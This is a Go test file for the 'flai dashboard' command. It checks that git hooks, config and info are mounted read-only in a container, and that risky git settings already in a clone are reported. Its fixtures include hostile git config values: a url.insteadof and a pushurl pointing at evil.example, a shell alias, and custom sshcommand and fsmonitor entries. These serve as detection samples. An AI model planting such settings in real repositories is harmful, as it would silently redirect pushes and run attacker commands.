package cmd

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// gitProject is a project with a .git directory, as far as flai dashboard
// looks: the docker and git calls are the fake runner's.
func gitProject(t *testing.T) string {
	t.Helper()
	root := tempProject(t)
	for _, d := range []string{".git/hooks", ".flai-cache"} {
		_ = os.MkdirAll(filepath.Join(root, d), 0o755)
	}
	_ = os.WriteFile(filepath.Join(root, ".git", "config"), []byte("[core]\n\tbare = false\n"), 0o644)
	_ = os.WriteFile(filepath.Join(root, ".git", "hooks", "pre-commit.sample"), []byte("#!/bin/sh\n"), 0o755)
	return root
}

func dockerRun(f *fakeRunner) string {
	for _, c := range f.calls {
		if strings.HasPrefix(c, "docker run ") {
			return c
		}
	}
	return ""
}

// S-0064: what git would run on the host is read-only in the container.
func TestDashboardMountsGitHooksConfigAndInfoReadOnly(t *testing.T) {
	t.Setenv("FLAI_CONFIG", filepath.Join(t.TempDir(), "outside", "cfg.json"))
	root := gitProject(t)
	f := &fakeRunner{images: map[string]bool{}, running: map[string]bool{}}
	out, errOut, code := runWith(t, root, f, "dashboard")
	if code != 0 {
		t.Fatal(errOut)
	}
	run := dockerRun(f)
	for _, rel := range []string{".git/hooks", ".git/info", ".git/config", ".flai-cache/dashboard.token"} {
		want := "--volume " + filepath.Join(root, rel) + ":" + root + "/" + rel + ":ro"
		if !strings.Contains(run, want) {
			t.Errorf("missing %q in:\n%s", want, run)
		}
	}
	// the read-write clone comes first, so the read-only paths lie over it
	if rw, ro := strings.Index(run, "--volume "+root+":"+root+" "), strings.Index(run, ".git/hooks:ro"); rw < 0 || ro < rw {
		t.Errorf("the clone is mounted read-write before the read-only paths over it:\n%s", run)
	}
	if st, err := os.Stat(filepath.Join(root, ".git", "info")); err != nil || !st.IsDir() {
		t.Error(".git/info is created on the host so the container cannot create it")
	}
	if strings.Contains(run, "cfg.json") {
		t.Errorf("a host config outside the clone is none of the container's business:\n%s", run)
	}
	if !strings.Contains(out, "read-only in the container: .git/hooks, .git/info, .git/config, .flai-cache/dashboard.token") || !strings.Contains(out, "ADR-0027") {
		t.Errorf("the operator is told:\n%s", out)
	}
	if strings.Contains(out, "already in this clone") {
		t.Errorf("a clean clone has nothing to report (a .sample hook is not a hook):\n%s", out)
	}
}

func TestDashboardGuardsAHostConfigKeptInsideTheClone(t *testing.T) {
	root := gitProject(t)
	cfg := filepath.Join(root, ".flai-cache", "config.json")
	t.Setenv("FLAI_CONFIG", cfg)
	f := &fakeRunner{images: map[string]bool{}, running: map[string]bool{}}
	if _, errOut, code := runWith(t, root, f, "dashboard"); code != 0 {
		t.Fatal(errOut)
	}
	if want := "--volume " + cfg + ":" + cfg + ":ro"; !strings.Contains(dockerRun(f), want) {
		t.Errorf("it names the image and the push key flai dashboard uses next time; missing %q in:\n%s", want, dockerRun(f))
	}
}

func TestDashboardSaysWhatTheCloneAlreadyHolds(t *testing.T) {
	t.Setenv("FLAI_CONFIG", filepath.Join(t.TempDir(), "cfg.json"))
	root := gitProject(t)
	_ = os.WriteFile(filepath.Join(root, ".git", "hooks", "pre-push"), []byte("#!/bin/sh\n"), 0o755)
	_ = os.WriteFile(filepath.Join(root, ".git", "hooks", "notes.txt"), []byte("not executable\n"), 0o644)
	f := &fakeRunner{images: map[string]bool{}, running: map[string]bool{},
		gitConfig: "core.bare=false\nuser.name=Olive\ncore.sshcommand=ssh -i /tmp/k\nalias.st=status\nalias.deploy=!sh deploy.sh\nurl.https://evil.example/.insteadof=git@github.com:\nfilter.lfs.smudge=git-lfs smudge %f\nremote.origin.url=git@github.com:o/r.git\nremote.origin.pushurl=git@evil.example:o/r.git"}
	out, errOut, code := runWith(t, root, f, "dashboard")
	if code != 0 {
		t.Fatal(errOut)
	}
	for _, want := range []string{
		"already in this clone",
		"hook .git/hooks/pre-push runs on every matching git command",
		"git setting core.sshcommand = ssh -i /tmp/k",
		"git setting alias.deploy = !sh deploy.sh",
		"git setting url.https://evil.example/.insteadof = git@github.com:",
		"git setting filter.lfs.smudge = git-lfs smudge %f",
		"git setting remote.origin.pushurl = git@evil.example:o/r.git",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q in:\n%s", want, out)
		}
	}
	for _, never := range []string{"alias.st", "user.name", "remote.origin.url =", "notes.txt", "pre-commit.sample"} {
		if strings.Contains(out, never) {
			t.Errorf("%q is not something git runs:\n%s", never, out)
		}
	}
	js, _, _ := runWith(t, gitProject(t), &fakeRunner{images: map[string]bool{}, running: map[string]bool{}, gitConfig: "core.fsmonitor=/tmp/x"}, "dashboard", "--json")
	var res struct {
		ReadOnly []string `json:"read_only"`
		Already  []string `json:"already_in_clone"`
	}
	if err := json.Unmarshal([]byte(js), &res); err != nil || len(res.ReadOnly) < 3 || len(res.Already) != 1 {
		t.Errorf("--json: %v %+v\n%s", err, res, js)
	}
}

func TestDashboardWithoutAGitDirectoryMountsNothingExtra(t *testing.T) {
	t.Setenv("FLAI_CONFIG", filepath.Join(t.TempDir(), "cfg.json"))
	root := tempProject(t)
	f := &fakeRunner{images: map[string]bool{}, running: map[string]bool{}}
	out, errOut, code := runWith(t, root, f, "dashboard")
	if code != 0 {
		t.Fatal(errOut)
	}
	if strings.Contains(dockerRun(f), ":ro") && strings.Contains(dockerRun(f), ".git/") {
		t.Errorf("nothing to protect:\n%s", dockerRun(f))
	}
	if !strings.Contains(out, "no .git directory") {
		t.Errorf("and it says so:\n%s", out)
	}
}

func TestDashboardStatusSaysWhetherGitIsReadOnlyInTheRunningContainer(t *testing.T) {
	t.Setenv("FLAI_CONFIG", filepath.Join(t.TempDir(), "cfg.json"))
	root := gitProject(t)
	f := &fakeRunner{images: map[string]bool{}, running: map[string]bool{"flaiover-t": true}}
	out, _, _ := runWith(t, root, f, "dashboard", "status")
	if !strings.Contains(out, "started by an older flai") || !strings.Contains(out, "restart it") {
		t.Errorf("a container without the read-only paths:\n%s", out)
	}
	f.roMounts = "/run/flaiover/token\n" + root + "/.git/hooks\n" + root + "/.git/config\n"
	out, _, _ = runWith(t, root, f, "dashboard", "status")
	if !strings.Contains(out, "git hooks, config, and info are read-only in the container") {
		t.Errorf("a container with them:\n%s", out)
	}
}
